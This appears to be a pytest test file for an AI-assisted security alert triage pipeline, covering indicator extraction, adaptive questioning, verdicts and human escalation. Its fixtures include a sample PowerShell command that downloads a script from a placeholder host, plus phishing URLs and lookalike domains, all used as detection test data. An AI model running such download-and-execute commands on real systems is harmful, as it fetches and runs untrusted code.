import json

import pytest
from pydantic_ai.models.test import TestModel

from triage.claude import ClaudeHelper
from triage.config import Settings
from triage.enrich import Enricher
from triage.facts import extract_facts
from triage.ioc import extract, parse_alert, refang
from triage.jev import MAX_PER_REQUEST, Jev
from triage.pipeline import TriageAgent
from triage.questions import Question, analyst_question
from triage.report import to_markdown

from .fakes import CLEAN_DOMAIN, CLEAN_HASH, EVIL_HASH, EVIL_IP, UNKNOWN_DOMAIN, FakeJev, mock_client


def settings(**kw) -> Settings:
    s = Settings(typesafe_api_key="test", vt_api_key="vt", abusech_auth_key="ac", abuseipdb_api_key="ab",
                 anthropic_api_key=None, vt_rpm=100000)
    for k, v in kw.items():
        setattr(s, k, v)
    return s


def agent(fake: FakeJev, claude: ClaudeHelper | None = None, **kw) -> TriageAgent:
    s = settings(**kw)
    return TriageAgent(s, Jev(s, model=fake), Enricher(s, client=mock_client()), claude)


def by_qid_prefix(result, prefix):
    return [f for f in result.findings if f.question and prefix in f.question]


# ------------------------------------------------------------------ extraction
def test_extract_refangs_and_filters():
    text = (f"User clicked hxxps://evil[.]example-login[.]top/a?b=1 from 10.0.0.5, then powershell.exe ran "
            f"C:\\Users\\bob\\invoice.exe ({EVIL_HASH}) and connected to {EVIL_IP} and 8.8.8.8. "
            f"Mail from attacker@phish-bank[.]com. Update from download.windowsupdate.com")
    ex = extract(parse_alert(text), allowlist=Settings().allowlist_domains)
    values = {i.value: i.type for i in ex.iocs}
    assert values["https://evil.example-login.top/a?b=1"] == "url"
    assert values["evil.example-login.top"] == "domain"
    assert values[EVIL_HASH] == "sha256" and values[EVIL_IP] == "ip" and values["8.8.8.8"] == "ip"
    assert values["phish-bank.com"] == "domain"
    assert "powershell.exe" not in values and "invoice.exe" not in values
    assert "10.0.0.5" in ex.internal_ips
    assert any("windowsupdate" in s for s in ex.skipped)


def test_extract_json_skips_id_fields():
    alert = {"id": "d41d8cd98f00b204e9800998ecf8427e", "event_id": "0123456789abcdef0123456789abcdef",
             "file": {"md5": "44d88612fea8a8f36de82e1278abb02f"}, "dns": {"query": "bad.zip"}}
    assert {i.value for i in extract(alert).iocs} == {"44d88612fea8a8f36de82e1278abb02f", "bad.zip"}


def test_usernames_and_internal_names_are_not_domains():
    ex = extract("User CORP\\j.alvarez and m.chen on ws01.corp.local reached evil-cdn.top and paypa1.co.uk")
    assert {i.value for i in ex.iocs} == {"evil-cdn.top", "paypa1.co.uk"}


def test_refang():
    assert refang("hxxp://a[.]b(.)c[:]80") == "http://a.b.c:80"


def test_facts_from_json_and_text():
    f = extract_facts({"host": "WS-1", "user": "bob", "process": {"name": "rundll32.exe", "cmdline": "rundll32 x.dll,Go",
                                                                  "parent": "winword.exe"}, "network": [{"dst_port": 443}]})
    assert f.has_process and f.parents == ["winword.exe"] and f.commandlines == ["rundll32 x.dll,Go"] and 443 in f.ports
    t = extract_facts('From: "IT" <it@micros0ft-login.com>\nSubject: Password expires\nUser clicked the link. Sign-in from 1.2.3.4')
    assert t.has_email and t.has_login and t.subjects == ["Password expires"]


def test_analyst_question_parsing():
    assert analyst_question("Is the user in finance?", 1).kind == "yesno"
    q = analyst_question("Which stage? [blocked | executed | spreading]", 2)
    assert q.kind == "choice" and list(q.options) == ["blocked", "executed", "spreading"]


# ------------------------------------------------------------------ the adaptive loop
async def test_malicious_file_in_one_round():
    r = await agent(FakeJev()).triage({"title": "Suspicious process beacon", "file": {"sha256": EVIL_HASH}, "host": "WS-042"})
    assert r.verdict == "malicious" and r.decided_by == "jev" and r.rounds == 1
    assert r.category == "command_and_control" and r.severity == "high"
    ioc = next(i for i in r.indicators if i.value == EVIL_HASH)
    assert ioc.verdict == "malicious" and "trojan.cobaltstrike" in ioc.threat_labels
    # Jev also answered the file-specific question, not only "malicious?"
    assert any("legitimate, widely used program" in f.question and f.answer == "no" for f in r.findings)
    assert "MALICIOUS" in to_markdown(r)


async def test_benign_signed_file():
    r = await agent(FakeJev()).triage(f"Rare binary executed: {CLEAN_HASH} contacting {CLEAN_DOMAIN}")
    assert r.verdict == "benign" and r.decided_by == "jev"
    assert r.recommended_actions[0].startswith("Close as benign")


async def test_questions_adapt_to_alert_type_and_answers():
    """A process alert gets process questions (not email/sign-in ones); a 'yes' to 'downloads from the
    internet?' opens the follow-up 'is it a script or executable?' in the same round."""
    alert = {"title": "Office spawned PowerShell", "host": "WS-7",
             "process": {"parent": "WINWORD.EXE", "cmdline": "powershell -nop -enc SQBFAFgA... iwr https://cdn-x.top/a.ps1"}}
    r = await agent(FakeJev()).triage(alert)
    asked = {f.question for f in r.findings}
    assert any("obfuscated or encoded" in q for q in asked)
    assert not any("sender in `facts`" in q or "sign-ins from places" in q for q in asked)
    follow = next(f for f in r.findings if "script or executable that would run next" in f.question)
    assert follow.origin == "follow-up" and "was yes" in follow.why and follow.round == 1
    macro = next(f for f in r.findings if "document-to-script chain" in f.question)
    assert macro.origin == "follow-up"
    assert r.verdict == "malicious"


async def test_unsure_then_jev_picks_lead():
    """Round 1: brand-new domain nobody flags -> unsure. Jev picks the lead 'look up the IP it resolves to',
    which is a known-bad Tor exit -> round 2 confident."""
    r = await agent(FakeJev()).triage({"name": "DNS query to rare domain", "dns": {"query": UNKNOWN_DOMAIN}})
    assert r.rounds == 2 and r.verdict == "malicious" and r.decided_by == "jev"
    assert r.leads and f"lookup {EVIL_IP}" in r.leads[0]
    pivot = next(i for i in r.indicators if i.value == EVIL_IP)
    assert pivot.found_via == f"pivot:{UNKNOWN_DOMAIN}" and pivot.verdict == "malicious"
    assert any("Tor exit" in f.question and f.subject == EVIL_IP and f.answer == "yes" for f in r.findings)
    verdicts = [f.answer for f in r.findings if f.origin == "verdict" and "malicious, meaning" in f.question]
    assert verdicts == ["unclear", "yes"]
    # the network question is re-asked once the new lookup arrived
    c2 = [f for f in r.findings if "talking to infrastructure judged malicious" in f.question]
    assert [f.round for f in c2] == [1, 2] and c2[-1].answer == "yes"


async def test_analyst_ask_and_note():
    r = await agent(FakeJev()).triage(
        {"title": "odd login", "user": "j.alvarez"},
        notes=["j.alvarez works in the finance team"],
        questions=["Is the user in `alert` in the finance team, according to `analyst_notes`?", "Which is it? [phishing | insider | test]"])
    assert [a.answer for a in r.analyst_answers] == ["yes", "phishing"]
    md = to_markdown(r)
    assert "### Your questions" in md and "finance team" in md


async def test_claude_writes_new_questions_jev_answers_them():
    written = {"questions": [{"text": "Does `alert` mention a VPN client?", "kind": "yesno", "yes": "names a VPN", "no": "no VPN"}]}
    claude = ClaudeHelper(settings(), model=TestModel(custom_output_args=written))
    fake = FakeJev(alert_overrides=[0.5, 0.97])
    r = await agent(fake, claude=claude, max_rounds=2).triage({"title": "weird", "dns": {"query": UNKNOWN_DOMAIN}})
    q = next(f for f in r.findings if f.origin == "claude")
    assert q.question == "Does `alert` mention a VPN client?" and q.round == 2  # answered by Jev in the next round
    assert r.verdict == "malicious"


async def test_guardrail_blocks_benign_when_intel_is_hard():
    r = await agent(FakeJev(alert_overrides=[0.03, 0.03, 0.03])).triage({"title": "x", "sha256": EVIL_HASH})
    assert r.verdict == "needs_human" and r.conflicts and "hard hits" in r.conflicts[0]


async def test_stays_unsure_escalates_to_human():
    r = await agent(FakeJev(alert_overrides=[0.5, 0.5]), max_rounds=2).triage({"title": "odd", "dns": {"query": UNKNOWN_DOMAIN}})
    assert r.verdict == "needs_human" and "still unsure" in r.stop_reason
    assert r.recommended_actions[0].startswith("Hand to an analyst")


async def test_authorised_admin_is_benign():
    r = await agent(FakeJev()).triage(open("samples/admin_benign.txt").read())
    assert r.verdict == "benign"
    assert any("authorised administration" in f.question and f.answer == "yes" for f in r.findings)


async def test_jev_batches_are_split_and_state_is_json():
    fake = FakeJev()
    jev = Jev(settings(), model=fake)
    qs = [Question(f"q{i}", "yesno", f"Is thing {i} true?") for i in range(MAX_PER_REQUEST + 5)]
    answers = await jev.ask({"alert": "x"}, qs, "goal")
    assert len(answers) == len(qs) and len(fake.requests) == 2
    assert isinstance(fake.requests[0].state, dict)
    json.dumps(fake.requests[0].state)
